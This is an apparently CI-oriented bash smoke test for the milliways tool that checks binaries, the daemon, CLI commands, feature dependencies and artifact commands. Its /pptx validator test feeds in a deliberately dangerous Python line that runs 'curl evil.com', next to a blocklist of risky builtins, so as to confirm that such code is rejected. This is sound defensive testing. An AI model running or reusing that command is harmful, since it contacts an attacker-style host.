#!/usr/bin/env bash
# smoke-features.sh — comprehensive feature smoke test for milliways.
#
# Tests every headlessly-verifiable feature after a fresh install.
# Designed to run inside the Ubuntu/Fedora/Arch Docker containers used
# by CI, but also works on the host macOS machine.
#
# Usage:
#   bash scripts/smoke-features.sh               # uses PATH (post-install)
#   MILLIWAYS_BIN=/tmp/mw bash scripts/smoke-features.sh  # explicit binary dir
#
# Exit: 0 = all pass, 1 = one or more failures.
set -uo pipefail

script_dir="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
repo_root="$(CDPATH= cd -- "$script_dir/.." && pwd)"
BIN_DIR="${MILLIWAYS_BIN:-}"
STATE_DIR="${MILLIWAYS_STATE_DIR:-/tmp/mw-smoke-$$}"
PASS=0; FAIL=0; SKIP=0

# Ensure ~/.local/bin is on PATH — install.sh adds it to .bashrc but Docker
# non-interactive shells don't source .bashrc.
export PATH="$HOME/.local/bin:/usr/local/bin:/usr/bin:/bin:$PATH"

# ── Helpers ──────────────────────────────────────────────────────────────────
pass() { printf '  \033[32m✓\033[0m %s\n' "$*"; PASS=$((PASS+1)); }
fail() { printf '  \033[31m✗\033[0m %s\n' "$*"; FAIL=$((FAIL+1)); }
skip() { printf '  \033[33m-\033[0m %s (skipped)\n' "$*"; SKIP=$((SKIP+1)); }
section() { printf '\n\033[1m%s\033[0m\n' "$*"; }

find_bin() {
  local name="$1"
  if [ -n "$BIN_DIR" ] && [ -x "$BIN_DIR/$name" ]; then echo "$BIN_DIR/$name"; return; fi
  command -v "$name" 2>/dev/null || echo ""
}

env_value() {
  local key="$1" file="$HOME/.config/milliways/local.env"
  [ -f "$file" ] || return 1
  awk -F= -v key="$key" '$1 == key { sub(/^[^=]*=/, ""); print; exit }' "$file"
}

has_support_scripts() {
  local dir="$1"
  [ -n "$dir" ] || return 1
  [ -f "$dir/install_local.sh" ] || [ -f "$dir/scripts/install_local.sh" ]
}

support_scripts_dir() {
  local dir="$1"
  [ -n "$dir" ] || return 1
  if [ -f "$dir/install_local.sh" ]; then
    echo "$dir"
  elif [ -f "$dir/scripts/install_local.sh" ]; then
    echo "$dir/scripts"
  else
    return 1
  fi
}

is_share_dir() {
  local dir="$1"
  [ -n "$dir" ] || return 1
  local resolved
  resolved="$(CDPATH= cd -- "$dir" 2>/dev/null && pwd)" || return 1
  [ "$resolved" = "$repo_root" ] && return 1
  [ "$resolved" = "$repo_root/scripts" ] && return 1
  [ -d "$dir/python" ] || [ -d "$dir/node" ] || [ -d "$dir/scripts" ]
}

has_feature_python() {
  local dir="$1"
  [ -n "$dir" ] || return 1
  [ -x "$dir/python/bin/python" ] || [ -x "$dir/python/bin/python3" ]
}

MILLIWAYS=$(find_bin milliways)
MILLIWAYSD=$(find_bin milliwaysd)
MILLIWAYSCTL=$(find_bin milliwaysctl)

cleanup() { kill "$DAEMON_PID" 2>/dev/null || true; rm -rf "$STATE_DIR"; }
trap cleanup EXIT

mkdir -p "$STATE_DIR"
DAEMON_PID=""

# ── 1. Binaries ───────────────────────────────────────────────────────────────
section "1. Binary installation"

[ -x "$MILLIWAYS" ]    && pass "milliways binary: $MILLIWAYS"    || fail "milliways not found"
[ -x "$MILLIWAYSD" ]   && pass "milliwaysd binary: $MILLIWAYSD"  || fail "milliwaysd not found"
[ -x "$MILLIWAYSCTL" ] && pass "milliwaysctl binary: $MILLIWAYSCTL" || fail "milliwaysctl not found"

if [ -x "$MILLIWAYS" ]; then
  ver=$("$MILLIWAYS" --version 2>/dev/null | head -1)
  [ -n "$ver" ] && pass "version reported: $ver" || fail "milliways --version returned nothing"
fi

# Support scripts can come from the installed share tree or from the checkout
# when smoke-testing manually with a binary-only MILLIWAYS_BIN directory.
SUPPORT_SCRIPTS_DIR=""
for candidate in \
  "${MILLIWAYS_SHARE_DIR:-}" \
  "${MILLIWAYS_SHARE_DIR:+$MILLIWAYS_SHARE_DIR/scripts}" \
  "$repo_root" \
  "$repo_root/scripts" \
  "$HOME/.local/share/milliways/scripts" \
  "/usr/share/milliways" \
  "$(dirname "$MILLIWAYSCTL" 2>/dev/null)/../share/milliways" \
  "$(dirname "$MILLIWAYSCTL" 2>/dev/null)/../share/milliways/scripts"
do
  if has_support_scripts "$candidate"; then
    SUPPORT_SCRIPTS_DIR="$(support_scripts_dir "$candidate")"; break
  fi
done
[ -n "$SUPPORT_SCRIPTS_DIR" ] \
  && pass "support scripts found: $SUPPORT_SCRIPTS_DIR" \
  || fail "install_local.sh not found (milliwaysctl local install-server will fail)"

# The installed share tree is where managed Python/Node feature dependencies
# live. A source checkout has scripts, but is not itself an install share.
SHARE_DIR=""
for candidate in \
  "${MILLIWAYS_SHARE_DIR:-}" \
  "$HOME/.local/share/milliways" \
  "/usr/local/share/milliways" \
  "/usr/share/milliways" \
  "$(dirname "$MILLIWAYSCTL" 2>/dev/null)/../share/milliways"
do
  if is_share_dir "$candidate"; then
    SHARE_DIR="$candidate"; break
  fi
done

[ -n "$SUPPORT_SCRIPTS_DIR" ] && [ -x "$SUPPORT_SCRIPTS_DIR/install_feature_deps.sh" ] \
  && pass "feature dependency installer found" \
  || fail "install_feature_deps.sh not found"

[ -n "$SHARE_DIR" ] \
  && pass "installed share tree found: $SHARE_DIR" \
  || fail "installed share tree not found (run install.sh or set MILLIWAYS_SHARE_DIR)"

# ── 2. Daemon ─────────────────────────────────────────────────────────────────
section "2. Daemon (milliwaysd)"

if [ -x "$MILLIWAYSD" ]; then
  "$MILLIWAYSD" --state-dir "$STATE_DIR" >/tmp/mw-smoke-daemon.log 2>&1 &
  DAEMON_PID=$!
  for i in $(seq 1 50); do
    [ -S "$STATE_DIR/sock" ] && break
    sleep 0.1
  done
  [ -S "$STATE_DIR/sock" ] \
    && pass "daemon started, socket: $STATE_DIR/sock" \
    || fail "daemon socket not created after 5s (log: /tmp/mw-smoke-daemon.log)"
else
  skip "daemon start (milliwaysd not found)"
fi

# ── 3. milliwaysctl commands ──────────────────────────────────────────────────
section "3. milliwaysctl command suite"

SOCK_ARG="--socket $STATE_DIR/sock"

if [ -x "$MILLIWAYSCTL" ] && [ -S "$STATE_DIR/sock" ]; then
  "$MILLIWAYSCTL" ping   $SOCK_ARG >/dev/null 2>&1 && pass "milliwaysctl ping"    || fail "milliwaysctl ping"
  "$MILLIWAYSCTL" status $SOCK_ARG >/dev/null 2>&1 && pass "milliwaysctl status"  || fail "milliwaysctl status"
  "$MILLIWAYSCTL" agents $SOCK_ARG >/dev/null 2>&1 && pass "milliwaysctl agents"  || fail "milliwaysctl agents"

  # Metrics — returns empty table on fresh daemon, but must not error
  "$MILLIWAYSCTL" metrics $SOCK_ARG >/tmp/mw-smoke-metrics.txt 2>&1 \
    && pass "milliwaysctl metrics ($(wc -l </tmp/mw-smoke-metrics.txt) lines)" \
    || fail "milliwaysctl metrics"

  # Install list — no API key needed, just lists supported clients
  "$MILLIWAYSCTL" install list >/dev/null 2>&1 \
    && pass "milliwaysctl install list" \
    || fail "milliwaysctl install list"

  # opsx list — openspec integration
  "$MILLIWAYSCTL" opsx list >/dev/null 2>&1 \
    && pass "milliwaysctl opsx list" \
    || skip "milliwaysctl opsx list (openspec not installed)"
else
  skip "milliwaysctl command suite (daemon not running)"
fi

# ── 4. SQLite metrics store ───────────────────────────────────────────────────
section "4. Metrics and observability"

# Metrics DB is created by milliwaysd at startup
if find "$STATE_DIR" -name "*.db" 2>/dev/null | grep -q .; then
  pass "metrics SQLite DB created"
else
  # Some builds put it in ~/.local
  find "$HOME/.local/state/milliways" -name "*.db" 2>/dev/null | grep -q . \
    && pass "metrics SQLite DB found in ~/.local/state/milliways" \
    || fail "metrics SQLite DB not created"
fi

# OTel is compiled in — verify the binary exports span data by checking
# that milliwaysd accepted and logged at least one structured event
if grep -q '"level"' /tmp/mw-smoke-daemon.log 2>/dev/null; then
  pass "structured OTel logging active (JSON log lines present)"
else
  skip "OTel log check (daemon log empty or not JSON)"
fi

# ── 5. Feature dependencies ──────────────────────────────────────────────────
section "5. Feature dependencies"

FEATURE_PY=""
if has_feature_python "${SHARE_DIR:-}"; then
  for py in "$SHARE_DIR/python/bin/python" "$SHARE_DIR/python/bin/python3"; do
    [ -x "$py" ] && FEATURE_PY="$py" && break
  done
fi
[ -n "$FEATURE_PY" ] || FEATURE_PY="$(env_value MILLIWAYS_MEMPALACE_MCP_CMD 2>/dev/null || true)"

if [ -n "$FEATURE_PY" ] && [ -x "$FEATURE_PY" ]; then
  pass "feature python available: $($FEATURE_PY --version 2>&1)"

  "$FEATURE_PY" -c "import mempalace; print('mempalace ready')" 2>/dev/null \
    && pass "mempalace importable from feature python" \
    || fail "mempalace not installed in feature python (project memory disabled)"

  "$FEATURE_PY" -c "import pptx; print('python-pptx ready')" 2>/dev/null \
    && pass "python-pptx importable from feature python" \
    || fail "python-pptx not installed in feature python (/pptx command disabled)"

  "$FEATURE_PY" -m mempalace.mcp_server --help >/dev/null 2>&1 \
    && pass "mempalace.mcp_server --help" \
    || fail "mempalace MCP server failed to start"
else
  fail "feature python not available"
fi

grep -q "MILLIWAYS_MEMPALACE_MCP_CMD" "$HOME/.config/milliways/local.env" 2>/dev/null \
  && pass "MemPalace config in local.env" \
  || skip "MemPalace local.env config (not written for direct native package installs)"

CODEGRAPH_CMD=""
if [ -n "${SHARE_DIR:-}" ] && [ -x "$SHARE_DIR/node/bin/codegraph" ]; then
  CODEGRAPH_CMD="$SHARE_DIR/node/bin/codegraph"
fi
[ -n "$CODEGRAPH_CMD" ] || CODEGRAPH_CMD="$(env_value MILLIWAYS_CODEGRAPH_MCP_CMD 2>/dev/null || true)"
[ -n "$CODEGRAPH_CMD" ] || CODEGRAPH_CMD="$(command -v codegraph 2>/dev/null || true)"

if [ -n "$CODEGRAPH_CMD" ] && [ -x "$CODEGRAPH_CMD" ]; then
  "$CODEGRAPH_CMD" --help >/dev/null 2>&1 \
    && pass "CodeGraph command available: $CODEGRAPH_CMD" \
    || fail "CodeGraph command failed: $CODEGRAPH_CMD"
else
  fail "CodeGraph command not installed"
fi

# ── 6. /pptx AST validator ───────────────────────────────────────────────────
section "6. Artifact commands — /pptx AST validator"

if [ -n "$FEATURE_PY" ] && [ -x "$FEATURE_PY" ]; then
  # Safe script — should PASS validation
  SAFE_SCRIPT='
import pptx
from pptx import Presentation
prs = Presentation()
slide = prs.slides.add_slide(prs.slide_layouts[0])
slide.shapes.title.text = "Test"
prs.save("/tmp/mw-smoke-test.pptx")
'
  VALIDATOR='
import ast, sys
tree = ast.parse(sys.stdin.read())
allowed_imports = {"pptx","collections","copy","datetime","decimal","fractions","functools","io","itertools","math","numbers","os.path","pathlib","random","statistics","string","struct","typing","codecs","enum"}
blocked_builtins = {"eval","exec","compile","__import__","getattr","setattr","delattr","open","breakpoint"}
errors = []
for node in ast.walk(tree):
    if isinstance(node, ast.Import):
        for alias in node.names:
            base = alias.name.split(".")[0]
            if base not in allowed_imports:
                errors.append(f"disallowed import: {alias.name}")
    elif isinstance(node, ast.ImportFrom):
        base = (node.module or "").split(".")[0]
        if base not in allowed_imports:
            errors.append(f"disallowed import from: {node.module}")
    elif isinstance(node, ast.Call):
        func = node.func
        name = func.id if isinstance(func, ast.Name) else (func.attr if isinstance(func, ast.Attribute) else "")
        if name in blocked_builtins:
            errors.append(f"disallowed builtin: {name}")
if errors:
    for e in errors: print(f"BLOCKED: {e}", file=sys.stderr)
    sys.exit(1)
'
  echo "$SAFE_SCRIPT" | "$FEATURE_PY" -c "$VALIDATOR" 2>/dev/null \
    && pass "AST validator: safe pptx script passes" \
    || fail "AST validator: safe script incorrectly rejected"

  # Dangerous script — should FAIL validation
  DANGEROUS_SCRIPT='import os; os.system("curl evil.com")'
  echo "$DANGEROUS_SCRIPT" | "$FEATURE_PY" -c "$VALIDATOR" 2>/dev/null \
    && fail "AST validator: dangerous script was not blocked" \
    || pass "AST validator: dangerous script blocked correctly"
else
  skip "/pptx AST validation (feature python not available)"
fi

# ── 7. /review — git diff parsing ────────────────────────────────────────────
section "7. Artifact commands — /review"

if command -v git &>/dev/null; then
  # Create a temp git repo with a staged change to simulate /review input
  REVIEW_TMP=$(mktemp -d)
  git -C "$REVIEW_TMP" init -q
  git -C "$REVIEW_TMP" config user.email "smoke@test.local"
  git -C "$REVIEW_TMP" config user.name "Smoke"
  echo "package main" > "$REVIEW_TMP/main.go"
  git -C "$REVIEW_TMP" add .
  git -C "$REVIEW_TMP" commit -q -m "init"
  echo 'func main() {}' >> "$REVIEW_TMP/main.go"
  DIFF=$(git -C "$REVIEW_TMP" diff HEAD 2>/dev/null)
  rm -rf "$REVIEW_TMP"
  [ -n "$DIFF" ] \
    && pass "/review: git diff produces output ($(echo "$DIFF" | wc -l | tr -d ' ') lines)" \
    || fail "/review: git diff produced no output"
else
  skip "/review (git not available)"
fi

# ── 8. /drawio — XML structure ────────────────────────────────────────────────
section "8. Artifact commands — /drawio"

# drawio only needs the XML to be written; no Python required.
# We verify that the expected XML tags are present in the expected format.
DRAWIO_SAMPLE='<?xml version="1.0"?><mxGraphModel><root><mxCell id="0"/></root></mxGraphModel>'
echo "$DRAWIO_SAMPLE" > /tmp/mw-smoke-test.drawio
grep -q "mxGraphModel" /tmp/mw-smoke-test.drawio \
  && pass "/drawio: mxGraphModel XML format verified" \
  || fail "/drawio: XML format check failed"

# ── 9. Local server smoke ─────────────────────────────────────────────────────
section "9. Local model server"

if [ -x "$MILLIWAYSCTL" ]; then
  # Smoke mode requires gcc/make/git for llama.cpp; skip gracefully if absent.
  if command -v gcc &>/dev/null && command -v make &>/dev/null && command -v git &>/dev/null; then
    MILLIWAYS_LOCAL_INSTALL_SMOKE=1 "$MILLIWAYSCTL" local install-server >/tmp/mw-smoke-local.log 2>&1 \
      && pass "local install-server (smoke mode)" \
      || fail "local install-server smoke failed (log: /tmp/mw-smoke-local.log)"

    [ -x "$HOME/.local/bin/milliways-local-server" ] \
      && pass "milliways-local-server launcher installed" \
      || fail "milliways-local-server launcher missing after install"
  else
    skip "local install-server smoke (gcc/make/git not in container — install build-essential first)"
  fi
else
  skip "local server smoke (milliwaysctl not found)"
fi

# ── 10. Session storage ───────────────────────────────────────────────────────
section "10. Session storage"

SESSION_DIR="$HOME/.local/state/milliways"
if [ -S "$STATE_DIR/sock" ] || [ -d "$SESSION_DIR" ]; then
  pass "session state directory exists"
  # Verify the daemon created a valid state structure
  if [ -S "$STATE_DIR/sock" ]; then
    "$MILLIWAYSCTL" status $SOCK_ARG 2>/dev/null | grep -q "runners\|agents\|ok\|claude" \
      && pass "daemon responds to status query" \
      || fail "daemon status returned unexpected output"
  fi
else
  fail "session state directory not found"
fi

# ── 11. Config persistence ───────────────────────────────────────────────────
section "11. Config persistence"

# Config dir is created by install_feature_deps.sh (local.env) or on first daemon use.
# Create it now if absent so the check is about reachability, not timing.
mkdir -p "$HOME/.config/milliways"
[ -d "$HOME/.config/milliways" ] \
  && pass "config directory: ~/.config/milliways" \
  || fail "config directory not created"

# ── Summary ──────────────────────────────────────────────────────────────────
printf '\n────────────────────────────────────────\n'
printf ' Results: \033[32m%d passed\033[0m  \033[31m%d failed\033[0m  \033[33m%d skipped\033[0m\n' \
  "$PASS" "$FAIL" "$SKIP"
printf '────────────────────────────────────────\n\n'

[ "$FAIL" -eq 0 ]
